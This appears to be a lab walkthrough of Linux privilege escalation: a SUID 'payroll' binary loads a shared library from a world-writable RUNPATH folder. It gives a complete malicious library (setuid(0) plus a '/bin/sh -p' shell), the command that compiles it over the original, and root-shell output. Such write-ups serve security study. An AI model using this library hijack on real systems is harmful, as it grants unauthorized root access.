You will found any binary with SUID permissions for example in our case we have `payroll` 

There is a **binary file** named `payroll` that runs with **root privileges** (because it has the `suid` bit set). But it depends on an external **shared library** called `libshared.so`.

This library is **not located in a secure system folder** like `/lib`, but instead in a **world-writable folder**: `/development/`.

That means **any user (even low-privilege)** can **replace** the library with a **malicious one** — and **trick the root program** into running their code!


#### Step 1: Identify a SUID Binary

You found a binary like this:
```bash
ls -la payroll
-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
```
### Step 2: Check Which Libraries It Loads

Use `ldd` to list shared libraries used by `payroll`:
```bash
ldd payroll
```

You saw this:
```bash
`libshared.so => /development/libshared.so`
```
🚨 It is loading `libshared.so` from a folder **we can write to**!

### Step 3: Verify If It Has a Custom Load Path

You used `readelf` to confirm:
```bash
`readelf -d payroll | grep PATH`
```

You saw:

```bash
0x000000000000001d (RUNPATH) Library runpath: [/development]
```
🔥 This tells the binary to load libraries from `/development` **first**, even before default folders like `/lib`.

### Step 4: Write a Malicious Library `src.c`
You made a C file like this:

```bash
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```

- This creates a function named `dbquery()` (which `payroll` expects).
- Inside that function:
    - `setuid(0)` → switch to root
    - `system("/bin/sh -p")` → pop a shell **as root**

## Step 5: Compile Your Evil Library
```bash
gcc src.c -fPIC -shared -o /development/libshared.so
```
- `-fPIC`: Position-independent code (required for shared libraries)
- `-shared`: Create `.so` (shared object)

### Step 7: Run the Root Program
```bash
`./payroll`
```

You saw:

```bash
Malicious library loaded
# id
uid=0(root) gid=1000(mrb3n)
```
🎉 Boom! Root shell!